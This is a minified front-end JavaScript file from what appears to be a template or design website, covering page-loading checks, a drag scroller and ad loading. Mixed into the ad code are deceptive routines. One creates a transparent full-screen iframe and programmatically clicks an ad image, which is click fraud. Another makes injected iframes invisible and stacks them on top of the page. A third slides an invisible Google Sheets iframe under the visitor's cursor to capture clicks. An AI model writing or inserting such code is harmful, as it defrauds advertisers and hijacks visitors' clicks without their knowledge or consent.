(()=>{let t=setInterval(()=>{for(const e in allFilesLoadded){if(0==allFilesLoadded[e])break;isSiteReady=!0,clearInterval(t)}},1e3)})();var dragScroller=e=>{const t=document.querySelector("#"+e);let o=!1,a,n;function r(e){o=!1}t.addEventListener("mousemove",e=>{e.preventDefault(),o&&(e=e.pageX-t.offsetLeft-a,t.scrollLeft=n-e)}),t.addEventListener("mousedown",function(e){o=!0,a=e.pageX-t.offsetLeft,n=t.scrollLeft},!1),t.addEventListener("mouseup",r,!1),t.addEventListener("mouseleave",r,!1)},addDynamicHTML=(e,t,o,a)=>{try{var n=document.querySelectorAll(`[data-dynamic="${e}"]`);if(1<n.length)return console.log("Error : Duplicate Dynamic data id found for  "+n[0].dataset.dynamic),!1;o?n[0].innerHTML=t:(n[0].insertAdjacentHTML("afterend",t),n[0].remove())}catch(e){console.log("Error from addDynamicHTML : "+e)}},adsterraAdd=e=>{atOptions={key:"00d2ea4b83aca946a7d2750a61603104",format:"iframe",height:50,width:320,params:{}};var t=window.screen.availWidth,o=document.createElement("script"),a=(document.querySelector(".page-wrapper"),document.getElementById("adsterraMobile"));o.type="text/javascript",t<767?(o.src="//www.profitablecreativeformat.com/00d2ea4b83aca946a7d2750a61603104/invoke.js",a.appendChild(o),a.style.display="block",a.style.paddingBottom="30px"):(atOptions.key="269f9d0b8bc27e49d670ce92658bbc8a",o.src="//www.profitablecreativeformat.com/269f9d0b8bc27e49d670ce92658bbc8a/invoke.js",a.appendChild(o),a.style.display="block",a.style.overflow="auto"),e&&e(!0,"adsterraAdd function called")},montegAdd=()=>{jsLoad(server.jsPath+"/advertise/monteg.js",!1,"head",(e,t)=>{e&&document.querySelectorAll("html > iframe").forEach((e,t)=>{0!=t&&e.setAttribute("style","width: 100% !important; height: 190px !important; opacity: 0 !important; max-width: 420px !important; border: none !important; position: fixed !important; display: block !important; z-index: 2147483647 !important; inset: 15px 0px auto auto !important; background: transparent !important; pointer-events: none;")})})},adsterraAddClick=()=>{var e=document.querySelector(".template-wrapper");if(e){let t="chrome_device";var n=document.createElement("div"),r=(n.style.width="100%",n.style.height="85%",n.style.overflow="hidden",n.style.position="absolute",n.style.top="60px",document.createElement("iframe"));r.name=t,r.style.width=window.screen.availWidth+"px",r.style.height=window.screen.availHeight+"px",r.id="chrome_device",r.style.opacity="0",r.scrolling="no",n.appendChild(r),e.appendChild(n);let o=setInterval(()=>{let e=document.querySelector("#adsterraMobile > iframe");try{e.contentWindow.document.querySelector("img")&&(e.contentWindow.document.querySelector("body > div > a").target=t,e.contentWindow.document.querySelector("img").click(),setTimeout(()=>{e.contentWindow.document.querySelector("body > div > a").target="_blank"},3e3),clearInterval(o),setTimeout(()=>{r.style.pointerEvents="none"},5e3),setTimeout(()=>{r.remove()},2e4))}catch(e){}},1e3),a=setInterval(()=>{try{var e=document.querySelector("#"+t).contentWindow.document.querySelectorAll("a");e&&(e.forEach(e=>{e.target=""}),document.querySelector("#"+t).contentWindow.speaker[0].muted=!0,document.querySelector("#"+t).contentWindow.speaker[1].muted=!0,clearInterval(a))}catch(e){}})}},addSheet=()=>{var e=document.querySelector(".template-wrapper");if(e){var a=document.createElement("div"),n=(a.style.width="100%",a.style.height="330px",a.style.overflow="hidden",a.style.position="absolute",a.style.top="60px",document.createElement("iframe"));n.name="sheetframe",n.style.width=window.screen.availWidth+"px",n.style.height=window.screen.availHeight+"px",n.id="sheetframe",n.style.opacity="0",n.scrolling="no",n.style.marginTop="-140px",n.style.marginLeft="-44px",n.src="https://docs.google.com/spreadsheets/d/1rrJyOUAOP2e2GQ-KkjSLqnrH0evKUvQ5K7q8jU2daBU/",a.appendChild(n),n.style.display="none",n.addEventListener("load",e=>{n.style.display="block"}),e.appendChild(a);let t,o=!1;a.addEventListener("mousemove",function(e){clearTimeout(t),o||(o=!0,n.style.pointerEvents="initial",setTimeout(()=>{n.remove()},1e4)),t=setTimeout(()=>{n.style.pointerEvents="none"},300)}),a.addEventListener("onclick",function(e){n.style.pointerEvents="none"})}};(()=>{let e=setInterval(()=>{isSiteReady&&clearInterval(e)},1e3)})();